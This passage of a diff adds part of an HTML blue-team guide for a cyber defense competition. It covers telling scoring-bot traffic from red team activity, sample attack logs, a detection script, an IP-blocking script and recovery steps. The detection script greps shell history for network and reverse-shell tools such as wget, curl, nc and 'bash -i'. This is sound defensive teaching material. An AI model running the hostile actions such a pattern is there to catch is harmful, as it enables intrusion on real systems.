+                    <li>Predictable timing: Often runs checks at regular intervals (e.g., every 5, 10, or 15 minutes)</li>
+                    <li>Consistent source IPs: Typically comes from a small range of predetermined IPs</li>
+                    <li>Clean login patterns: Few or no failed login attempts before successful authentication</li>
+                    <li>Limited command execution: Executes a specific set of verification commands</li>
+                    <li>Short connection times: Usually connects briefly to verify service functionality</li>
+                    <li>Expected service testing: Only checks services required for scoring</li>
+                </ul>
+                
+                <p><strong>Red Team Attack Patterns:</strong></p>
+                <ul>
+                    <li>Irregular timing: Often occurs outside scoring check intervals</li>
+                    <li>Varied source IPs: May rotate through different IPs or use unexpected addresses</li>
+                    <li>Multiple failed attempts: Often shows password guessing or brute force patterns</li>
+                    <li>Unusual commands: Executes reconnaissance, persistence, or privilege escalation commands</li>
+                    <li>Longer connections: May maintain persistent access</li>
+                    <li>Unusual port scanning: Probes ports not related to scoring requirements</li>
+                </ul>
+                
+                <p><strong>Example Log Patterns - Scoring Bot vs. Red Team</strong></p>
+                <p>Scoring Bot (Apache access log):</p>
+                <pre>172.20.0.50 - - [14/Mar/2025:10:00:05 -0500] "GET /index.html HTTP/1.1" 200 2126 "-" "NCAE-ScoreBot/1.0"
+172.20.0.50 - - [14/Mar/2025:10:15:07 -0500] "GET /index.html HTTP/1.1" 200 2126 "-" "NCAE-ScoreBot/1.0"
+172.20.0.50 - - [14/Mar/2025:10:30:06 -0500] "GET /index.html HTTP/1.1" 200 2126 "-" "NCAE-ScoreBot/1.0"</pre>
+                
+                <p>Red Team (Apache access log):</p>
+                <pre>192.168.1.218 - - [14/Mar/2025:10:17:32 -0500] "GET /index.html HTTP/1.1" 200 2126 "-" "Mozilla/5.0"
+192.168.1.218 - - [14/Mar/2025:10:17:35 -0500] "GET /.git/HEAD HTTP/1.1" 404 196 "-" "Mozilla/5.0"
+192.168.1.218 - - [14/Mar/2025:10:17:38 -0500] "GET /wp-login.php HTTP/1.1" 404 196 "-" "Mozilla/5.0"
+192.168.1.218 - - [14/Mar/2025:10:17:42 -0500] "GET /phpmyadmin HTTP/1.1" 404 196 "-" "Mozilla/5.0"</pre>
+                
+                <p>Scoring Bot (Auth log):</p>
+                <pre>Mar 14 10:05:01 ubuntu-server sshd[12345]: Accepted publickey for scorebot from 172.20.0.50 port 49812
+Mar 14 10:05:01 ubuntu-server sshd[12345]: pam_unix(sshd:session): session opened for user scorebot
+Mar 14 10:05:03 ubuntu-server sshd[12345]: pam_unix(sshd:session): session closed for user scorebot</pre>
+                
+                <p>Red Team (Auth log):</p>
+                <pre>Mar 14 10:22:15 ubuntu-server sshd[12567]: Failed password for invalid user admin from 192.168.1.218 port 53212
+Mar 14 10:22:17 ubuntu-server sshd[12568]: Failed password for invalid user root from 192.168.1.218 port 53220
+Mar 14 10:22:25 ubuntu-server sshd[12572]: Failed password for admin from 192.168.1.218 port 53245
+Mar 14 10:22:35 ubuntu-server sshd[12575]: Accepted password for ubuntu from 192.168.1.218 port 53250
+Mar 14 10:22:40 ubuntu-server sudo: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/bash</pre>
+                
+                <p><strong>Analysis Script for Detecting Red Team vs. Scoring Bot</strong></p>
+                <pre>#!/bin/bash
+# Save as detect_activity.sh
+
+echo "===== Analyzing Connections and Authentication Patterns ====="
+
+# Check if connection is from known scoring bot IP
+SCORING_IPS=("172.20.0.50" "172.20.0.51" "172.20.0.52")
+CURRENT_CONNS=$(ss -tn | grep ESTAB | awk '{print $5}' | cut -d: -f1)
+
+echo -e "\nCurrent connections from:"
+for IP in $CURRENT_CONNS; do
+    if [[ " ${SCORING_IPS[@]} " =~ " ${IP} " ]]; then
+        echo "$IP - LIKELY SCORING BOT"
+    else
+        echo "$IP - POTENTIAL RED TEAM"
+    fi
+done
+
+# Check for suspicious commands in history
+echo -e "\nRecent suspicious commands:"
+history | grep -E 'wget|curl|nc|chmod\+x|base64|bash.*-i'
+
+# Check for unusual processes
+echo -e "\nUnusual processes:"
+ps aux | grep -v "^root\|^www-data\|^mysql\|^ubuntu\|^sandbox\|^cron" | grep -v grep
+
+# Check authentication patterns
+echo -e "\nRecent authentication patterns:"
+RECENT_AUTH=$(grep "sshd" /var/log/auth.log | tail -20)
+echo "$RECENT_AUTH" | grep -E 'Accepted|Failed'
+
+# Check for attempts to access sensitive files
+echo -e "\nRecent sensitive file access attempts:"
+grep -E 'GET (/\.git/|/wp-|/admin|/config|/phpmy)' /var/log/apache2/access.log | tail -10</pre>
+            </section>
+            
+            <section id="real-time-response">
+                <h4>Real-Time Response Strategies</h4>
+                <p>When you detect potential red team activity:</p>
+                <ul>
+                    <li>Don't immediately block all connections - Verify it's not the scoring bot first</li>
+                    <li>Implement targeted blocking - Block specific IPs only after confirming they're not scoring-related</li>
+                    <li>Log but don't disrupt - Consider logging suspicious activity without taking action initially</li>
+                    <li>Use adaptive firewall rules - Block specific attack patterns rather than entire IP ranges</li>
+                </ul>
+                <p>Example of targeted blocking script:</p>
+                <pre>#!/bin/bash
+# Block IP but exclude scoring bot IPs
+
+IP_TO_BLOCK=$1
+SCORING_IPS=("172.20.0.50" "172.20.0.51" "172.20.0.52")
+
+for SCORE_IP in "${SCORING_IPS[@]}"; do
+    if [ "$IP_TO_BLOCK" == "$SCORE_IP" ]; then
+        echo "WARNING: Attempting to block scoring bot IP. Operation aborted."
+        exit 1
+    fi
+done
+
+echo "Blocking $IP_TO_BLOCK..."
+sudo iptables -A INPUT -s $IP_TO_BLOCK -j DROP
+echo "IP $IP_TO_BLOCK blocked. Monitor for scoring impacts."</pre>
+            </section>
+            
+            <section id="user-session-management">
+                <h4>User Session Management</h4>
+                <p>List active SSH sessions:</p>
+                <pre>w
+who</pre>
+                <p>Kill suspicious sessions:</p>
+                <pre># Kill by process ID
+kill &lt;PID&gt;
+
+# Kill all sessions for a specific user
+sudo pkill -KILL -u username</pre>
+                <p>Warning users about maintenance:</p>
+                <pre>wall "WARNING: Security maintenance in progress. Please save your work."</pre>
+            </section>
+        </section>
+        
+        <section id="recovery-procedures">
+            <h3>Recovery Procedures</h3>
+            
+            <section id="restoring-backups">
+                <h4>Restoring from Backups</h4>
+                <p>Quick restore of configuration files:</p>
+                <pre>#!/bin/bash
+# Restore Apache configuration
+sudo cp /home/sandbox/backups/apache2.conf /etc/apache2/apache2.conf
+sudo systemctl restart apache2</pre>
+                <p>Restoring from remote backups:</p>
+                <pre>sudo rsync -av sandbox@192.168.X.100:/home/sandbox/backups/apache2/ /etc/apache2/</pre>
+                <p>Test service functionality after restore</p>
+            </section>
+            
+            <section id="rebuilding-services">
+                <h4>Rebuilding Services</h4>
+                <p>Process for complete service rebuild:</p>
+                <ol>
+                    <li>Stop the service: <code>sudo systemctl stop apache2</code></li>
+                    <li>Backup current configuration: <code>cp -r /etc/apache2 /home/sandbox/apache2.bak</code></li>
+                    <li>Reinstall if necessary: <code>sudo apt install --reinstall apache2</code></li>
+                    <li>Replace configuration: <code>sudo cp /home/sandbox/backups/apache2.conf /etc/apache2/</code></li>
+                    <li>Restart service: <code>sudo systemctl restart apache2</code></li>
+                    <li>Verify functionality: <code>curl localhost</code></li>
+                </ol>
+            </section>
+            
+            <section id="service-availability">
+                <h4>Maintaining Service Availability</h4>
+                <ul>
+                    <li>Minimize downtime during recovery</li>
+                    <li>Prioritize services for recovery based on scoring</li>
+                </ul>
+            </section>
+        </section>
+    </section>
+</body>
+</html>
